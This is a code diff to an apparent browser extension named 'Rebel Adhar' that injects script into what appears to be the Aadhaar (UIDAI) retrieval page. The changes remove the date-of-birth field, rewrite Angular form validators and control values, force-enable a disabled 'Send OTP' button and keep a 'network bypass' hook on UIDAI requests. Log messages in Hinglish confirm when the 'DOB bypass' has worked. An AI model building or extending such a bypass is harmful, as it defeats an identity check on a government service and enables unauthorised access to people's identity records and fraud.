@@ -11,7 +11,7 @@
   const DISABLED_MARK = 'rebel-dob-disabled';
   const HIDDEN_MARK = 'rebel-dob-hidden';
   const DOB_LABEL = /date\s*of\s*birth|\bdob\b|birth\s*date|जन्म|जन्म\s*तिथि/i;
-  const ENGINE_VERSION = '12.2.0';
+  const ENGINE_VERSION = '12.3.0';
 
   let dobWatcher = null;
   let watchTimer = null;
@@ -615,6 +615,61 @@
     return false;
   }
 
+  function findNgControlFromElement(el) {
+    if (!el) return null;
+    let cur = el;
+    for (let depth = 0; depth < 28 && cur; depth++, cur = cur.parentElement) {
+      const ctx = cur.__ngContext__;
+      if (Array.isArray(ctx)) {
+        for (let i = 0; i < ctx.length; i++) {
+          const item = ctx[i];
+          if (item?.control?.setValue) return { control: item.control, name: item.name || item._parent?.name || '' };
+          if (item?.setValue && item?.status && typeof item.updateValueAndValidity === 'function') {
+            return { control: item, name: item._parent?.name || '' };
+          }
+        }
+      }
+      if (typeof window.ng?.getComponent === 'function') {
+        try {
+          const cmp = window.ng.getComponent(cur);
+          const fcn = el.getAttribute('formcontrolname') || el.getAttribute('ng-reflect-name') || '';
+          const forms = [cmp?.form, cmp?.formGroup, cmp?.retrieveForm, cmp?.aadhaarForm];
+          for (const form of forms) {
+            if (!form?.controls) continue;
+            if (fcn && form.controls[fcn]) return { control: form.controls[fcn], name: fcn };
+            for (const [key, ctrl] of Object.entries(form.controls)) {
+              if (ctrl?.valueAccessor?.nativeElement === el) return { control: ctrl, name: key };
+            }
+          }
+        } catch (_e) {}
+      }
+    }
+    return null;
+  }
+
+  function syncNgControlsFromDom(log) {
+    let n = 0;
+    getMatFields().forEach((f) => {
+      const type = classifyField(f);
+      if (type === 'dob' || type === 'toggle' || type === 'email') return;
+      const input = f.input;
+      if (!input || input.type === 'hidden') return;
+      const val = readInputVal(input);
+      if (!val) return;
+      const hit = findNgControlFromElement(input);
+      if (!hit?.control?.setValue) return;
+      try {
+        hit.control.setValue(val, { emitEvent: true });
+        hit.control.markAsDirty?.();
+        hit.control.markAsTouched?.();
+        hit.control.updateValueAndValidity?.({ emitEvent: true });
+        n += 1;
+      } catch (_e) {}
+    });
+    if (n) log?.('info', 'NgControl synced', { count: n });
+    return n;
+  }
+
   function syncAngularInputs(log) {
     let n = 0;
     getMatFields().forEach((f) => {
@@ -627,11 +682,19 @@
       try {
         nativeInputSet?.call(input, val);
       } catch (_e) {}
-      ['input', 'change', 'blur'].forEach((evt) => {
+      try {
+        input.dispatchEvent(
+          new InputEvent('input', { bubbles: true, cancelable: true, inputType: 'insertText', data: val })
+        );
+      } catch (_e1) {
+        input.dispatchEvent(new Event('input', { bubbles: true, cancelable: true }));
+      }
+      ['change', 'blur'].forEach((evt) => {
         input.dispatchEvent(new Event(evt, { bubbles: true, cancelable: true }));
       });
       n += 1;
     });
+    syncNgControlsFromDom(log);
     if (n) log?.('info', 'Angular inputs synced', { count: n });
     return n;
   }
@@ -1324,20 +1387,79 @@
       }
     });
 
+    getMatFields().forEach((f) => {
+      const type = classifyField(f);
+      if (type !== 'name' && type !== 'mobile' && type !== 'captcha') return;
+      let el = f.input || f.mff;
+      for (let i = 0; i < 20 && el; i++, el = el.parentElement) {
+        walkNg(el, (item) => {
+          [item, item?.form].forEach((form) => {
+            if (!isFormGroup(form) || seen.has(form)) return;
+            seen.add(form);
+            groups.push(form);
+          });
+        });
+        if (Array.isArray(el.__ngContext__)) deepScanObject(el.__ngContext__, groups, scanSeen, 0);
+        const cmp = getComponentFromElement(el);
+        [cmp, cmp?.form, cmp?.formGroup, cmp?.retrieveForm, cmp?.aadhaarForm].forEach((form) => {
+          if (!isFormGroup(form) || seen.has(form)) return;
+          seen.add(form);
+          groups.push(form);
+        });
+      }
+    });
+
     return groups;
+  }
+
+  function findOtpButton() {
+    return qAll('button, [role="button"], input[type="submit"]').find((btn) => {
+      const t = norm(btn.textContent || btn.value || '');
+      return t.includes('send otp') || t.includes('request otp');
+    });
+  }
+
+  function enableMatOtpButton(log) {
+    const btn = findOtpButton();
+    if (!btn) return false;
+    btn.disabled = false;
+    btn.removeAttribute('disabled');
+    btn.setAttribute('aria-disabled', 'false');
+    btn.classList.remove('mat-mdc-button-disabled', 'mat-button-disabled', 'disabled', 'mdc-button--disabled');
+    btn.style.pointerEvents = 'auto';
+    btn.style.opacity = '1';
+  }
+
+  function prepForUserOtp(uiSel, log) {
+    if (dobFieldVisible(uiSel)) removeDobFromDom(uiSel, log);
+    fixAngularValidators(log);
+    patchAngularControlValues(log);
+    syncAngularInputs(log);
+    syncNgControlsFromDom(log);
+    enableOtpButtons();
+    enableMatOtpButton(log);
+    return buildSubmitState(uiSel, log, { quiet: true });
   }
 
   function collectNgControls() {
     const out = [];
     const seen = new WeakSet();
+    function addCtrl(ctrl, key, el) {
+      if (!ctrl?.setValue || seen.has(ctrl)) return;
+      seen.add(ctrl);
+      out.push({ ctrl, key: key || 'ctrl', el });
+    }
+    getMatFields().forEach((f) => {
+      const type = classifyField(f);
+      if (type === 'toggle') return;
+      const hit = findNgControlFromElement(f.input);
+      if (hit?.control) addCtrl(hit.control, hit.name || type, f.input);
+    });
     getDobInputs().forEach((input) => {
       let el = input;
       for (let i = 0; i < 12 && el; i++, el = el.parentElement) {
         walkNg(el, (item) => {
-          if (item?.control?.setValue && !seen.has(item.control)) {
-            seen.add(item.control);
-            out.push({ ctrl: item.control, key: item.name || item._parent?.name || 'dob', el: input });
-          }
+          if (item?.control?.setValue) addCtrl(item.control, item.name || item._parent?.name || 'dob', input);
         });
         if (Array.isArray(el.__ngContext__)) {
           const scanSeen = new WeakSet();
@@ -1399,15 +1521,35 @@
     return !!(mobile?.ok && captcha?.ok);
   }
 
+  function ngCtxDepth(el) {
+    let cur = el;
+    for (let i = 0; i < 20 && cur; i++, cur = cur.parentElement) {
+      if (Array.isArray(cur.__ngContext__)) return { depth: i, type: 'array' };
+    }
+    return { depth: -1, type: 'none' };
+  }
+
   function getFormDiagnostics(uiSel) {
     const groups = collectFormGroups().filter((g) => g.controls);
-    const sample = getDobInputs()[0];
+    const mobileInput = getMatFields().find((f) => classifyField(f) === 'mobile')?.input;
+    const mobileCtx = mobileInput ? ngCtxDepth(mobileInput) : { depth: -1, type: 'none' };
+    const ngHits = getMatFields()
+      .filter((f) => {
+        const t = classifyField(f);
+        return t === 'name' || t === 'mobile' || t === 'captcha';
+      })
+      .map((f) => ({ type: classifyField(f), hasNg: !!findNgControlFromElement(f.input)?.control }));
+    const otpBtn = findOtpButton();
     return {
       formCount: groups.length,
       ngControls: collectNgControls().length,
+      ngFieldHits: ngHits,
       invalid: groups.filter((g) => g.status === 'INVALID').length,
       statuses: groups.slice(0, 5).map((g) => g.status),
-      ngCtxType: sample ? typeof sample.__ngContext__ : 'none',
+      ngCtxType: mobileCtx.type,
+      ngCtxDepth: mobileCtx.depth,
+      hasNgApi: typeof window.ng?.getComponent === 'function',
+      otpBtnDisabled: !!(otpBtn?.disabled || otpBtn?.classList?.contains('mat-mdc-button-disabled')),
       dobBypassed: isDobBypassed(uiSel),
       dobInForm: getDobInputs().length,
       dobVisible: dobFieldVisible(uiSel),
@@ -1897,7 +2039,11 @@
     buildOtpPayload,
     buildRetrievePayloads,
     prepareOtpLight,
+    prepForUserOtp,
+    findOtpButton,
     syncAngularInputs,
+    syncNgControlsFromDom,
+    findNgControlFromElement,
     fixAngularValidators,
     patchAngularControlValues,
     invokeViaPageHttp,
@@ -1928,7 +2074,7 @@
 });
 
 /**
- * Runs inside PAGE context — Angular same world, zero click block when form OK.
+ * PAGE context — DOB bypass only. OTP = user khud dabata hai, zero interference.
  */
 (function () {
   if (window.__rebelPageBridge) return;
@@ -1942,8 +2088,7 @@
     '#rebel-adhar-log-panel,#rebel-fab,#rebel-switch-btn,#rebel-logs-btn,#rebel-debug-btn,#rebel-status-strip';
 
   let uidaiOkCount = 0;
-  let skipOtp = false;
-  let otpWatch = null;
+  let prepTimer = null;
 
   function isOn() {
     try {
@@ -1960,10 +2105,6 @@
     console.log('[Rebel Adhar PAGE]', level, msg, data ?? '');
   }
 
-  function uidaiOkSince(before) {
-    return uidaiOkCount > before;
-  }
-
   E.installNetworkBypass({
     log: emit,
     enabled: isOn,
@@ -1971,96 +2112,40 @@
       if (!isOn()) return;
       uidaiOkCount += 1;
       emit('req', kind + ' ' + method + ' ' + status, String(url || '').slice(0, 120));
+      emit('info', 'OTP sent — UIDAI ' + status, { url: String(url || '').slice(0, 80) });
     },
   });
 
-  function isOtpBtn(el) {
-    const btn = el?.closest?.('button,[role="button"],a,input[type="submit"]');
-    if (!btn) return null;
-    const t = E.norm(btn.textContent || btn.value || '');
-    if (!t.includes('send otp') && !t.includes('request otp')) return null;
-    return btn;
+  function runPrep() {
+    if (!isOn() || !E.isDobBypassed?.(UI_SEL)) return;
+    if (E.prepForUserOtp) E.prepForUserOtp(UI_SEL, emit);
+    else if (E.prepareOtpLight) E.prepareOtpLight(UI_SEL, emit);
   }
 
-  function quickPrepCheck() {
-    if (!E.isDobBypassed(UI_SEL)) return { ok: false, reason: 'dob' };
-    if (!E.isFormReadyForOtp(UI_SEL)) return { ok: false, reason: 'form' };
-    return { ok: true };
+  function onFieldInput(e) {
+    if (!isOn() || !E.isDobBypassed?.(UI_SEL)) return;
+    const input = e.target?.closest?.('input, textarea');
+    if (!input || input.type === 'hidden') return;
+    if (E.syncNgControlsFromDom) E.syncNgControlsFromDom(emit);
   }
 
-  function armOtpWatch(btn) {
-    const before = uidaiOkCount;
-    if (otpWatch) clearTimeout(otpWatch.timer);
-    emit('info', 'OTP armed — Angular click free', { v: E.ENGINE_VERSION });
-    const timer = setTimeout(function () {
-      otpWatch = null;
-      if (uidaiOkSince(before)) {
-        emit('info', 'OTP sent', { via: 'angular-2xx', v: E.ENGINE_VERSION });
-        return;
-      }
-      emit('warn', 'Angular 2xx nahi — pipeline retry');
-      skipOtp = true;
-      const run = E.invokeOtpPipeline
-        ? E.invokeOtpPipeline(btn, UI_SEL, emit, function () {
-            return uidaiOkSince(before);
-          }, { skipNative: true, lightPrep: true })
-        : Promise.resolve({ ok: false });
-      Promise.resolve(run)
-        .then(function (result) {
-          if (result && result.ok && uidaiOkSince(before)) {
-            emit('info', 'OTP sent', { via: result.via || 'pipeline', v: E.ENGINE_VERSION });
-          } else if (!uidaiOkSince(before)) {
-            emit('error', 'NO UIDAI 2xx — v' + E.ENGINE_VERSION + ' Copy Debug bhejo');
-            emit('info', 'Debug', E.getFormDiagnostics ? E.getFormDiagnostics(UI_SEL) : {});
-          }
-        })
-        .finally(function () {
-          skipOtp = false;
-        });
-    }, 6000);
-    otpWatch = { before: before, btn: btn, timer: timer };
+  function startPrepLoop() {
+    if (prepTimer) clearInterval(prepTimer);
+    prepTimer = setInterval(runPrep, 2500);
+    runPrep();
   }
 
-  document.addEventListener(
-    'pointerdown',
-    function (e) {
-      if (!isOn() || skipOtp) return;
-      const btn = isOtpBtn(e.target);
-      if (!btn) return;
-      if (E.prepareOtpLight) E.prepareOtpLight(UI_SEL, emit);
-      const chk = quickPrepCheck();
-      if (chk.ok) armOtpWatch(btn);
-    },
-    true
-  );
-
-  document.addEventListener(
-    'click',
-    function (e) {
-      if (!isOn() || skipOtp) return;
-      const btn = isOtpBtn(e.target);
-      if (!btn) return;
-      const chk = quickPrepCheck();
-      if (!chk.ok) {
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        if (otpWatch) {
-          clearTimeout(otpWatch.timer);
-          otpWatch = null;
-        }
-        if (chk.reason === 'dob') {
-          emit('error', 'DOB bypass fail — Bypass DOB dabao', {});
-        } else {
-          emit('error', 'Pehle naam + mobile + captcha bharo', E.getFormDiagnostics?.(UI_SEL));
-        }
-      }
-    },
-    true
-  );
+  function stopPrepLoop() {
+    if (prepTimer) clearInterval(prepTimer);
+    prepTimer = null;
+  }
 
   function bootPage() {
-    if (!isOn()) return;
-    emit('info', 'Rebel PAGE v' + E.ENGINE_VERSION + ' injected');
+    if (!isOn()) {
+      stopPrepLoop();
+      return;
+    }
+    emit('info', 'Rebel PAGE v' + E.ENGINE_VERSION + ' — khud Send OTP dabao');
     E.waitForForm(30000).then(function (ready) {
       if (!ready) {
         emit('warn', 'Form timeout — page reload karo');
@@ -2068,10 +2153,11 @@
       }
       return E.apply(UI_SEL, emit).then(function () {
         const bypassed = E.isDobBypassed(UI_SEL);
-        emit('info', bypassed ? 'DOB bypass OK — Send OTP' : 'Bypass DOB dabao', {
+        emit('info', bypassed ? 'DOB bypass OK — ab khud Send OTP dabao' : 'Bypass DOB dabao', {
           dobVisible: E.dobFieldVisible(UI_SEL),
           orLinks: E.discoverOrLinks ? E.discoverOrLinks(UI_SEL).map(function (l) { return l.text; }) : [],
         });
+        if (bypassed) startPrepLoop();
       });
     });
   }
@@ -2079,12 +2165,18 @@
   window.addEventListener('message', function (e) {
     if (!e.data || e.data.rebel !== 1 || e.data.type !== 'cmd') return;
     if (e.data.cmd === 'boot') bootPage();
-    if (e.data.cmd === 'apply') E.apply && E.apply(UI_SEL, emit);
+    if (e.data.cmd === 'apply') {
+      E.apply && E.apply(UI_SEL, emit);
+      runPrep();
+    }
     if (e.data.cmd === 'diag') {
       const d = E.getFormDiagnostics ? E.getFormDiagnostics(UI_SEL) : {};
       window.postMessage({ rebel: 1, type: 'diag', id: e.data.id, data: d }, '*');
     }
   });
+
+  document.addEventListener('input', onFieldInput, true);
+  document.addEventListener('change', onFieldInput, true);
 
   if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', bootPage);
